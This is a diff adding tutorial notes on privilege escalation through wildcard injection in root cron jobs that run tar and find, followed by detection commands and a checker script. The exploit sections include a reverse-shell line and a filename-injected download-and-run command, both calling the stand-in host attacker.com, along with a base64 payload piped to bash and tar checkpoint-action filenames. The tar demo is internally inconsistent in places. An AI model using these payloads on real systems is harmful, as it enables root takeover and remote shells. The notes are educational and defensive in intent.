@@ -1,0 +1,236 @@
+1.	Scenario 1 – tar
+—————————————————————————————————————————————————————————————————————————————
+
+  Setup
+
+  ,----
+  | echo "test1" > file1.txt && echo "test2" > file2.txt && echo "test3" > file3.txt
+  `----
+
+  Suppose a cronjob is configured to execute the following script as the
+  root user.
+
+  ,----
+  | cd /tmp/scenario1
+  | tar -cf /tmp/scenario1.tar *
+  `----
+
+  If we're able to write into the `/tmp/scenario1' directory, then we
+  can exploit such script as follows:
+
+  1. First we create a script containing the malicious code that we want
+     to force the root user to execute.
+
+  ,----
+  | echo 'touch /tmp/scenario1/hacked' > /tmp/scenario1/shell.sh
+  `----
+
+  1. Then we create the following two files
+
+  ,----
+  | echo "" > "--checkpoint-action=/shell.sh"
+  | echo "" > "--checkpoint=1"
+  `----
+
+  When the script will execute, the initial command
+
+  ,----
+  | tar -cf /tmp/scenario1.tar *
+  `----
+
+  will be expanded into
+
+  ,----
+  | tar -cf /tmp/scenario1.tar --checkpoint=1  --checkpoint-action=exec=sh shell.sh file1.txt   file2.txt   file3.txt   shell.sh
+  `----
+
+  which will trigger the code execution
+
+  ,----
+  | $ ls
+  | '--checkpoint=1'  '--checkpoint-action=exec=sh shell.sh'   file1.txt   file2.txt   file3.txt   hacked   shell.sh
+  `----
+
+Real-World Scenario: Privilege Escalation via tar and --checkpoint-action=exec
+
+🏢 Context
+On a production Linux server, a backup script is set up by the system administrator to archive web application files daily using tar. The cron job is:
+tar -cf /backups/site-$(date +%F).tar /var/www/html
+
+A junior sysadmin modifies it to display progress during large backups, so they use:
+tar --checkpoint=100 --checkpoint-action=exec=echo "Checkpoint hit" -cf /backups/site-$(date +%F).tar /var/www/html
+
+Later, they change it to execute a custom script instead of echo:
+tar --checkpoint=100 --checkpoint-action=exec=/usr/local/bin/notify.sh -cf /backups/site.tar /var/www/html
+
+This script is owned by root and not properly secured:
+-rwxrwxrwx 1 root root  /usr/local/bin/notify.sh
+
+🧑‍💻 Attacker’s Position
+	•	Attacker is a low-privileged user (www-data)
+	•	Can write files into /var/www/html (e.g., via file uploads)
+	•	Knows that tar runs every night as root and executes a script (notify.sh) they can modify
+
+💣 The Exploit
+Step 1: Modify the script
+As a low-privileged user:
+echo "bash -i >& /dev/tcp/attacker.com/4444 0>&1" > /usr/local/bin/notify.sh
+chmod +x /usr/local/bin/notify.sh
+
+Step 2: Set up a listener
+On attacker’s machine:
+nc -lvnp 4444
+
+Step 3: Wait for cron to run the tar command
+The next time the cron job runs and hits a checkpoint, it executes the modified script as root, which initiates a reverse shell to the attacker — as root.
+
+
+2.	Scenario 2 – find
+—————————————————————————————————————————————————————————————————————————————
+
+  Suppose you have the following command. The command will delete all
+  files that are not `jpg' or `png' or `gif'.
+
+  ,----
+  | /usr/bin/find . -type f -not -regex '.*\.\(jpg\|png\|gif\)' -exec bash -c "rm -f {}" \;
+  `----
+
+  If we have such configuration, we can exploit by creating the
+  following file.
+
+  ,----
+  | touch ./"file.exe; echo dG91Y2ggL3RtcC9oYWNrZWQ= | base64 -d | bash"
+
+echo dG91Y2ggL3RtcC9oYWNrZWQ= | base64 -d
+# becomes:
+touch /tmp/hacked
+
+  `----
+
+  Notice that the file contains a base64 payload that will be decoded
+  and then executed by bash. The payload is as follows
+
+  ,----
+  | touch /tmp/hacked
+  `----
+
+Real-World Scenario: Vulnerable File Cleanup Script on a Web Server
+🎯 Context
+A system administrator sets up a daily cron job to clean up all files in the /var/www/uploads directory except images:
+#!/bin/bash
+cd /var/www/uploads
+/usr/bin/find . -type f -not -regex '.*\.\(jpg\|png\|gif\)' -exec bash -c "rm -f {}" \;
+
+This script is:
+	•	Run automatically by cron as root
+	•	Intended to prevent malicious file uploads (e.g., .exe, .php)
+	•	Vulnerable to command injection via filenames
+
+🧑‍💻 Attacker’s Position
+The attacker:
+	•	Can upload files via a vulnerable web form (no filename sanitization)
+	•	Knows the cron job runs every day
+
+🧨 The Exploit
+The attacker uploads a file with the following name:
+file.php; curl http://attacker.com/shell.sh | bash
+
+The full filename is:
+"file.php; curl http://attacker.com/shell.sh | bash"
+
+🚀 When the cleanup script runs:
+bash -c "rm -f file.php; curl http://attacker.com/shell.sh | bash"
+
+	•	It deletes the file
+	•	Then downloads and executes a remote reverse shell
+
+🎯 Result
+	•	Attacker gains remote code execution on the server
+	•	Since cron runs as root, attacker gets root access
+	•	Server compromised with just a cleverly named file
+
+Steps to identyfy the vulnarability:
+ ====================================================================================================================================
+ 🔍 1. Identify Writable Directories Owned by Root
+Find directories owned by root but writable by others (especially world-writable):
+
+  find / -type d -perm -0002 -user root 2>/dev/null
+
+Look for paths like /tmp, or custom directories created for automation, e.g., /var/backups.
+
+🔍 2. Check for Cron Jobs or Scripts Executed as Root
+List all cron jobs and see if they run tar, chown, chmod, or cp using wildcards:
+
+    grep -r "tar\|chown\|chmod\|cp" /etc/cron* 2>/dev/null | grep '\*'
+
+You can also list all cron jobs for root:
+
+    sudo crontab -l
+
+Then inspect any script that is run, e.g., if /root/scripts/backup.sh is used, inspect that file:
+
+    cat /root/scripts/backup.sh
+
+Check if the script has commands like:
+
+tar -czf /backup/backup.tar.gz /tmp/*
+chown root:root /tmp/*
+
+🔍 3. Check Systemd Services or Init Scripts
+Some background services may be running with root privileges and using wildcards:
+
+    grep -r "tar\|chown\|chmod\|cp" /etc/systemd/system/ /lib/systemd/system/ 2>/dev/null | grep '\*'
+
+If you find something, inspect the actual script called by the service.
+
+🔍 4. Check Permissions of the Script Directory
+If the directory where wildcards are used is writable by non-root users, it’s dangerous.
+
+Check with:
+
+    ls -ld /path/to/directory
+If you see drwxrwxrwx (world-writable) or if a user has write permission, this is a red flag.
+
+Bash script to check this:
+ ====================================================================================================================================
+ #!/bin/bash
+
+echo "[*] Checking for wildcard abuse vulnerability..."
+
+# 1. Check for cron jobs that use tar, chown, chmod, rsync, etc., with wildcards
+echo "[*] Searching for cron jobs run by root with potential wildcard usage..."
+cron_jobs=$(grep -r "tar\|chown\|chmod\|rsync\|cp" /etc/cron* 2>/dev/null | grep '\*')
+if [[ -n "$cron_jobs" ]]; then
+    echo "[!] Potential wildcard abuse found in cron jobs:"
+    echo "$cron_jobs"
+else
+    echo "[+] No dangerous wildcard usage found in cron jobs."
+fi
+
+# 2. Check for systemd services or scripts run as root
+echo "[*] Searching for systemd services running scripts with wildcard usage..."
+services=$(grep -r "tar\|chown\|chmod\|rsync\|cp" /etc/systemd/system /lib/systemd/system 2>/dev/null | grep '\*')
+if [[ -n "$services" ]]; then
+    echo "[!] Potential wildcard abuse found in systemd services:"
+    echo "$services"
+else
+    echo "[+] No dangerous wildcard usage found in systemd services."
+fi
+
+# 3. Check for world-writable directories owned by root
+echo "[*] Checking for world-writable directories owned by root..."
+writable_dirs=$(find / -type d -perm -0002 -user root 2>/dev/null)
+if [[ -n "$writable_dirs" ]]; then
+    echo "[!] Found world-writable directories owned by root (could be abused):"
+    echo "$writable_dirs"
+else
+    echo "[+] No world-writable directories owned by root found."
+fi
+
+# 4. Recommend manual test (optional)
+echo "[*] If any vulnerable script is found, try creating files like:"
+echo "    touch /path/to/dir/--checkpoint=1"
+echo "    touch /path/to/dir/--checkpoint-action=exec=sh shell.sh"
+echo "    where shell.sh is your payload (e.g., reverse shell)"
+
+echo "[*] Done."
